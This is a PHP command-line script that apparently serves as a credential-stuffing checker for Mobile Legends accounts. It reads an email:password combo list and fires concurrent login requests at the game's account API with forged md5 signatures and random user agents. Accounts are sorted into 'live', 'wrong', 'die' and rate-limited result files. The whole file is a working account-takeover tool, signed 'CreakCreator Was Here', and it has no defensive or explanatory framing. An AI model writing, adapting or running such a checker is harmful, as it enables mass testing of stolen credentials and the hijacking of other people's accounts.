<?php
require_once('vendor/autoload.php');
date_default_timezone_set('Asia/Jakarta');
use \Curl\MultiCurl;
$climate = new League\CLImate\CLImate;

function chk ($emailist,$req) {
    $multi_curl = new MultiCurl();
    $multi_curl->setOpt(CURLOPT_ENCODING, '');
    $multi_curl->beforeSend(function ($instance) {
        $instance->setUserAgent(randstr(100));
        $instance->setCookieJar('cookies/cookies.txt');
        $instance->setCookieFile('cookies/cookies.txt');
    });
    $multi_curl->complete(function ($instance) {
        $climate = new League\CLImate\CLImate;
        $respon = $instance->response;
        $api = json_decode($respon);
        if (strpos($respon, '"code":0')) {
            saveEmail('result/live.txt',$instance->input);
            $climate->out("[<light_green>LIVE</light_green>] ".$instance->input."");
        } else if (strpos($respon, '"code":1005')) {
            saveEmail('result/wrong.txt',$instance->input);
            $climate->out("[<light_yellow>WRONG</light_yellow>] ".$instance->input. "");
        } else if (strpos($respon, '"code":1004')) {
            saveEmail('result/die.txt',$instance->input);
            $climate->out("[<light_red>DIE</light_red>] ".$instance->input. "");
        } else if (strpos($respon, '"code":1016')) {
            saveEmail('result/often.txt',$instance->input);
            $climate->out("[<light_magenta>Often</light_magenta>] ".$instance->input."");
        } else {
            saveEmail('result/unknown.txt',$instance->input);
            $climate->out("[<light_blue>UNKNOWN</light_blue>] ".$instance->input. "");
        }
        });
        if ($req > 500) {
    for ($i=0; $i<100; $i++) {
        $contents = file($emailist, FILE_IGNORE_NEW_LINES);
        $eml = array_shift($contents);
        $empas = explode(':', $eml);
        $email = $empas[0];
        $pass = $empas[1];
        $md5pass = md5($pass);
        $generatesign = "account=".$email."&md5pwd=".$md5pass."&op=login";
        $sign = md5($generatesign);
        $data = array(
            'op' => 'login',
            'sign' => ''.$sign.'',
            'params' =>
            array(
                'account' => ''.$email.'',
                'md5pwd' => ''.$md5pass.'',
            ),
            'lang' => 'en',
        );
        $data = json_encode($data);
        $url = 'https://accountmtapi.mobilelegends.com';
        $instance = $multi_curl->addPost($url, $data);
        $instance->eml = $email;
        $instance->pass = $pass;
        $instance->input = $eml;
                file_put_contents($emailist, implode("\r\n", $contents));
        }
    } else {
                for ($i=0; $i<$req; $i++) {
                        $contents = file($emailist, FILE_IGNORE_NEW_LINES);
                        $eml = array_shift($contents);
                        $empas = explode(':', $eml);
                        $email = $empas[0];
                        $pass = $empas[1];
                        $md5pass = md5($pass);
                        $generatesign = "account=".$email."&md5pwd=".$md5pass."&op=login";
                        $sign = md5($generatesign);
                        $data = array(
                                'op' => 'login',
                                'sign' => ''.$sign.'',
                                'params' =>
                                array(
                                        'account' => ''.$email.'',
                                        'md5pwd' => ''.$md5pass.'',
                                ),
                                'lang' => 'en',
                        );
                        $data = json_encode($data);
                        $url = 'https://accountmtapi.mobilelegends.com';
                        $instance = $multi_curl->addPost($url, $data);
                        $instance->eml = $email;
                        $instance->pass = $pass;
                        $instance->input = $eml;
                        file_put_contents($emailist, implode("\r\n", $contents));
        }}
    $multi_curl->start();
}
// just randstring
function getStr($source, $start, $end) {
    $a = explode($start, $source);
    $b = explode($end, $a[0]);
    return $b[0];
}
function inStr($s, $as){
    $s = strtoupper($s);
    if(!is_array($as)) $as=array($as);
    for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
    return false;
    }
function randstr ($ln) {
    $char = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charLn = strlen($char);
    $rnd = '';
    for ($i = 0; $i < $ln; $i++) { $rnd .= $char[rand(0, $charLn - 1)]; }
    return $rnd;
}

// save eml to file
function saveEmail ($fileName,$line) {
    $file = fopen($fileName, 'a', FILE_APPEND);
    fwrite($file, $line."\n");
    fclose($file);
}

// print rez progress
function rezProgress ($emailist,$req,$delay) {
    $climate = new League\CLImate\CLImate;
    $climate->out("Over=>\t".count(file($emailist))."\nLIVE=>\t".count(file("result/live.txt"))."\nWRONG=>\t".count(file("result/wrong.txt"))."\nDIE=>\t".count(file("result/die.txt"))."\nOFTEN=>\t".count(file("result/often.txt"))."\nError=>\t".count(file("result/unknown.txt"))."");
}

$climate->out("CreakCreator Was Here !");

$clean = $climate->confirm('[+] Clean /result ?');
if ($clean->confirmed()) {
    file_put_contents('result/live.txt', "");
    file_put_contents('result/wrong.txt', "");
    file_put_contents('result/die.txt', "");
    file_put_contents('result/often.txt', "");
    file_put_contents('result/unknown.txt', "");
}

// get emailist file
$emailist = $climate->input('Emailist to check ?')->prompt();

// remove duplicate line
$rmDuplicate = $climate->confirm('Remove duplicate line ?');
if ($rmDuplicate->confirmed()) {
    $lines = file($emailist, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $lines = array_map('trim',$lines);
    $lines = array_unique($lines);
    file_put_contents($emailist, implode(PHP_EOL, $lines));
}

// count total email list file
$climate->br();
$climate->out("[+] Total ".count(file($emailist))." emails");
$climate->br();

// get input req and delay
$req = $climate->input('Threat ?')->prompt();
$delay = $climate->input('Delay ?')->prompt();
$climate->br();

// do check until emailist 0
while (count(file($emailist)) !== 0 ) {
    chk($emailist,$req);
    $climate->br();
    rezProgress($emailist,$req,$delay);
    sleep($delay);
}
?>
